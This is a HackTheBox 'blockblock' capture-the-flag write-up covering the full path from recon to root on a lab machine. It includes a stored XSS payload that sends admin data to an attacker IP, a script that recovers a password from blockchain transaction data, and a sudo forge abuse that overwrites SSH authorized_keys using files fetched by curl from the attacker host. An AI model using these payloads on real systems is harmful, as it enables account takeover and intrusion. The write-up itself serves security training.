---
layout: post
title: HTB - blockblock
date: 2025-04-02 09:03 -0400
---

{{ 'blockblock' | machine_img }}

## nmap
```bash
~/workspace/projects/htb/blockblock » sudo nmap -p- $(cat ip.txt) --min-rate 1024
[sudo] password for shafou:
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-04 10:22 -04
Nmap scan report for 10.10.11.43
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 77.30 seconds
```

Port 80 is a defi web app.
![main website](/assets/img/blockblock4.png)

8545 is the blockchain rpc endpoint.
Only `eth_blockNumber` seems to work without authentication.
![burp blockchain rpc1](/assets/img/blockblock2.png)
![burp blockchain rpc2](/assets/img/blockblock3.png)

`/api/contract_source` gives us the source code for the solidity part. Since its using a blockchain we can see the whole history and probably find the admin password in there.
```solidity
// Database.sol:38 ~ 42
    constructor(string memory secondaryAdminUsername,string memory password) {
        users["admin"] = User(password, "admin", true);
        owner = msg.sender;
        registerAccount(secondaryAdminUsername, password);
    }
```

There seems to be an XSS on username. So we can get the admin token from `/api/info`.
```python
import requests
import random
import base64

i = random.choice(range(1000000))
url = "http://blockblock.htb/api/register"
payload = b"""fetch("/api/info")
.then(res => { return res.text() })
.then(data => { return fetch(`http://10.10.14.9:5000/?info=${data}`) })
"""
payload = base64.b64encode(payload).decode()

payload = f"{i}<img src=x onerror=eval(atob('{payload}'))>"
headers = {
    "Content-Type": "application/json",
}
data = {"username": payload, "password": "asd", "repeatedPassword": "asd"}
response = requests.post(url, json=data, headers=headers)
t = response.json()["token"]

url = "http://blockblock.htb/api/report_user"
data = {"username": payload}
response = requests.post(url, json=data, headers=headers, cookies={"token": t})
```

After that we check the admin dashboard and find out how the auth works by accident.
![burp blockchain rpc3](/assets/img/blockblock1.png)

You can then add that token to the http header `token: <token>`

We can now check every transaction and look for the admin password.
```python
import requests
import string

url = "http://blockblock.htb:80/api/json-rpc"
cookies = {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjkxNTgzNiwianRpIjoiYjllZGYxZTItMWI5My00YWEyLTk2OGYtNjZhN2IyNmNhMzA1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFzZCIsIm5iZiI6MTc0MjkxNTgzNiwiZXhwIjoxNzQzNTIwNjM2fQ.bBE5GdYSLkEdJoTFJS0KrfhPBm08Z-Fep5tT8Yz9U2c"
}
headers = {
    "token": "e06e2af5449cb73b6d23bffa0302fe3b57a08f7075a7c6c93113e0fe26b74f68"
}
j = {
    "id": 1,
    "jsonrpc": "2.0",
    "method": "eth_getBlockByNumber",
    "params": ["0x01", True],
}
res = requests.post(
    url,
    headers=headers,
    cookies=cookies,
    json=j,
    proxies={"http": "http://0.0.0.0:8080", "https": "https://0.0.0.0:8080"},
)
trans = res.json()["result"]["transactions"]
for t in trans:
    code = t["input"][2:]

    s = [int(code[i : i + 2], 16) for i in range(0, len(code), 2)]

    dec = ""
    for c in s:
        try:
            c = chr(c)
            if c in string.printable:
                dec = dec + c
                continue

            dec = dec + "___"
        except:
            pass

    print(f"DEBUGPRINT[7]: dec.py:7: dec={dec}")
```

Kinda scuffed but its pretty clear what the password is:

```
keira___________________________________________________________________________________________
______________________________________________________________________________________SomedayBitCo
inWillCollapse__________________
```

it works for both `keira` and `admin`.

```bash
[keira@blockblock ~]$ cat user.txt
cd0fe***************************
```

# priv esc
## paul 1

The creds for the paul account are hardcoded on `/home/keira/webapp/db/db.py`. But this is kinda of guessy way to escalate.

```python
// database.py:16
account = web3.eth.account.decrypt(keystore, "september")
```

## paul 2
Another way to escalate to paul is with forge.
```bash
[keira@blockblock ~]$ sudo -l
User keira may run the following commands on blockblock:
    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge
```

You make a forge project. And write your key into paul's authorized keys.
```bash
#!/bin/bash

tar -cvf ./ble.tar.zx ble && mv ./ble.tar.zx ~/flask_lab/static/
sshpass -p 'SomedayBitCoinWillCollapse' ssh keira@$(cat ip.txt) \
  'rm -rf /tmp/123; \
   mkdir -p /tmp/123 && cd /tmp/123 && \
   curl 10.10.14.9:5000/static/ble.tar.zx -O && \
   tar -xvf ble.tar.zx && \
   cd /tmp/123/ble && \
   find -exec chmod 4777 {} \; && \
   sudo -u paul /home/paul/.foundry/bin/forge script script/Counter.s.sol:CounterScript -vvv'
```

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]

fs_permissions = [{ access = "read-write", path = "/" }]
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract CounterScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        vm.writeFile("/home/paul/.ssh/authorized_keys", "<SSH PUB KEY>");
        vm.stopBroadcast();
    }
}
```


## root
For root there is a pretty straight forward [poc](http://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/) to exploit pacman.

```bash
# sshpass -p 'september' ssh paul@$(cat ip.txt)
[paul@blockblock contracts]$ sudo -l
User paul may run the following commands on blockblock:
    (ALL : ALL) NOPASSWD: /usr/bin/pacman
```

```bash
[root@blockblock ~]# cat root.txt
ca20c***************************
```
